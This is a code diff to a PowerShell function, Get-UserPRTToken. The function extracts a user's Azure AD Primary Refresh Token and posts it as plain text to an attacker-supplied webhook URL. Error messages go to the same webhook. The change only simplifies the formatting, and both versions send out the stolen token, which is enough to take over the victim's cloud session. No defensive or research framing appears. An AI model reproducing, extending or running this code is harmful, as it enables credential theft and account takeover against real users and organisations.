@@ -67,28 +67,18 @@ function Get-UserPRTToken {
             $prtToken = $parsed.response.data
             Write-Host "[+] PRT successfully extracted." -ForegroundColor Green
 
-            # ✅ Format PRT if it starts with eyJ
-            if ($prtToken -match '^eyJ') {
-                $formattedToken = ($prtToken) -join "`n"
-            } else {
-                $formattedToken = $prtToken
-            }
+            # Send PRT token to webhook
+            Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $prtToken -ContentType "text/plain" -UseBasicParsing
+            Write-Host "[+] Token sent to webhook successfully." -ForegroundColor Green
 
-            # ✅ Send PRT token as plain text
-            Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $formattedToken -ContentType "text/plain" -UseBasicParsing
             return $prtToken
         }
         catch {
             $err = $_.Exception.Message
             Write-Warning "[!] $err"
 
-            # ✅ Format error if it starts with eyJ (optional)
-            if ($err -match '^eyJ') {
-                $err = ($err) -join "`n"
-            }
-
-            # ✅ Send error message as plain text
-            Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body $err -ContentType "text/plain" -UseBasicParsing -ErrorAction SilentlyContinue
+            # Send error message to webhook
+            Invoke-RestMethod -Uri $WebhookUrl -Method POST -Body "[ERROR] $err" -ContentType "text/plain" -UseBasicParsing -ErrorAction SilentlyContinue
         }
     }
 }
